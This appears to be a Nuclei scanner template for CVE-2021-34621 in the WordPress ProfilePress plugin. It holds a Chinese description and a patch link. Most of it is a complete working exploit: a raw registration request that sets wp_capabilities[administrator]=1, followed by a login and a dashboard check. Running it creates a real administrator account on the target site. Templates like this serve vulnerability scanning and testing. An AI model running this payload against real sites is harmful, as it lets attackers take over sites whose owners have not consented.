id: CVE-2021-34621
info:
  name: WordPress ProfilePress  3.0.0-3.1.3 - Admin User Creation Weakness
  author:
  - l0ne1y
  description: |-
    WordPress Plugin ProfilePress 逻辑问题导致任意注册管理员漏洞
    WordPress是WordPress（Wordpress）基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    WordPress 的 ProfilePress 插件3.0.0 - 3.1.3版本存在安全漏洞，该漏洞源于~/src/Classes/RegistrationAuth.php 文件中的用户注册组件。攻击者可以利用该漏洞以管理员身份在站点上注册。
  severity: critical
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.wordfence.com/blog/2021/06/easily-exploitable-critical-vulnerabilities-patched-in-profilepress-plugin/
requests:
- matchers:
  - type: word
    part: body
    words:
    - Welcome to your WordPress Dashboard
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-admin/admin-ajax.php HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*; q=0.01
    Content-Type: multipart/form-data; boundary=---------------------------138742543134772812001999326589
    Origin: {{BaseURL}}
    Referer: {{BaseURL}}

    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_username"

    {{randstr}}
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_email"

    {{randstr}}@example.com
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_password"

    {{randstr}}@example.com
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_password_present"

    true
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_first_name"

    {{randstr}}@example.com
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="reg_last_name"

    {{randstr}}@example.com
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="_wp_http_referer"

    /wp/?page_id=18
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="pp_current_url"

    {{BaseURL}}
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="wp_capabilities[administrator]"

    1
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="signup_form_id"

    1
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="signup_referrer_page"


    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="action"

    pp_ajax_signup
    -----------------------------138742543134772812001999326589
    Content-Disposition: form-data; name="melange_id"


    -----------------------------138742543134772812001999326589--
  - |
    POST /wp-login.php HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*; q=0.01
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Origin: {{BaseURL}}
    Referer: {{BaseURL}}

    log={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In
  - |
    GET /wp-admin/ HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Connection: close
  cookie-reuse: true
